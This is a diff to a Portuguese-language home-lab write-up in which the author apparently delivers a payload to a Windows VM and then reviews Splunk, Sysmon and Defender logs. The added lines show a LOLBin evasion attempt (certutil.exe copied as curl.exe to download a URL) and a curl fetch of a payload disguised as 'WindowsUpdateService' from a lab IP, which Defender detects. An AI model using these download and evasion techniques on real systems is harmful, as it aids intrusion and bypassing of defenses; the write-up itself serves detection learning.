@@ -262,10 +262,21 @@ Para tirar a duvida tentei realizar uma requisicao para um site benigno ```googl
 
  Even though the URL points to a legitimate domain (Google), Microsoft Defender flagged the activity as malicious and identified it as, 
  ``` Trojan:Win32/Ceprolad.A``` com isso signifca que o sistema de defasa do Windows Defender nao observa somente o destino das requisicoes mas 
- mas tambem observa o comportamento dos servicos dentro do sistema (behaviour-based).
+ mas tambem observa o comportamento dos servicos dentro do sistema (behaviour-based).Vamos tirar a prova final tentando uma ultima tecnica, vou criar uma copia do certutil.exe em um outro folder com um 
+ outro nome e vou tentar realizar uma requisicao atraves desta copia, abaixo vou deixar os comandos usados e a resposta recebida:
+
+```
+1.
+copy C:\Windows\System32\certutil.exe C:\Users\Public\curl.exe
+2.
+C:\Users\Public\curl.exe -urlcache -split -f https://www.google.com
+```
 
 
-Sendo assim decidi executar o delivery de uma forma mais simples atraves de uma requisicao curl 
+ [RESPOSTA DA SEGUNDA TENTATIVA USANDO CERTUTIL]
+ ![Image](https://github.com/user-attachments/assets/1d7c7848-f616-4888-bb17-a946f862cb52)
+
+Mesmo executando o comando de um outro diretorio e fazendo uma requisicao para um site confiavel o Windows Defender detectou a atividade e bloqueou a acao, sendo assim decidi executar o delivery de uma forma mais simples atraves de uma requisicao curl:
 
 ```curl http://192.168.56.101:7070/WindowsUpdateService```
 ![Image](https://github.com/user-attachments/assets/6b3edd1e-86f3-497a-99b3-917e924713c4)
@@ -275,8 +286,6 @@ Sendo assim decidi executar o delivery de uma forma mais simples atraves de uma 
  essa atividade gerou alguns logs interessantes que vamos analisar no proximo capitulo
 
 ![Image](https://github.com/user-attachments/assets/7647fae1-edd7-4f82-82a3-9d75d20fb688)
-
-
 
 
 ---
@@ -290,13 +299,13 @@ Trecho da config usada (ou link para ela).
 *TENTATIVAS DE LOGIN*
 
 
-*LOGS EM SPLUNK*
+[BRUTE FORCE EVIDENCE]
 ![Image](https://github.com/user-attachments/assets/f7f7b16d-4762-4bfe-aec9-bd20f96bf1fd)
 Essa quantidade tentativa de login em tao pouco tempo capturadas pelo splunk acende uma red flag analisando mais 
 a fundo nos logs em sysmon encontamos mais uma eveidencia de atividade maliciosa
-Durante a execução do payload ofuscado, mesmo antes de um shell ser estabelecido, o Sysmon registrou o seguinte comportamento:
+Durante a execução do payload ofuscado, mesmo antes de um shell ser estabelecido, o Event Viewer registrou os seguintes comportamentos:
 
-1. [Creation of Remote Treat]
+1. [CREATION OF REMOTE TREAT]
  ![Image](https://github.com/user-attachments/assets/405cbb63-bf4f-40df-a30c-8129ed814e56)
 Esse tipo de evento é típico de malwares que tentam executar código em outro processo para evitar detecção (como DLL injection). Entretanto nos ja sabemos que o malware nao foi nem se quer baixado
 entao eu acredito que este log foi acionado quando eu solicitei um cmd.exe via ssh, mesmo que nao esteja diretamente relacionado com o malware ainda sim e um artefato importante.
@@ -324,10 +333,15 @@ Action Taken:     Not Applicable
 Como podemos ver o Windows Defender bloqueou a requisicao antes que houve a conexao por isso nao foi identificado o IP.
 
 
-3.[CCONFIRMACAO DO BLOQUEIO PELO SISTEMA DE DEFESA]
+3.[CONFIRMACAO DO BLOQUEIO PELO SISTEMA DE DEFESA]
 ![Image](https://github.com/user-attachments/assets/c427e929-77b8-4468-bb63-cbeb4c7bad3f)
 
 Neste ultimo log nos temos a confirmacao de que a ameca foi removida com sucesso pelo windows defender ```Action Name: Remove```, ``` The operation completed successfully.```
+
+4.[IDENTIFICACAO DA SEGUNDA TENTATIVA]
+![Image](https://github.com/user-attachments/assets/aa39d6f0-9dad-4fba-831c-7bfe3a810af9)
+Por ultimos mas nao menos importante temos a confirmacao que o Windows Defender localizaou a execucao maliciosa do
+certutil.exe mesmo em um outro diretorio e com um nome diferente.
 
 ##CONCLUSAO 
 
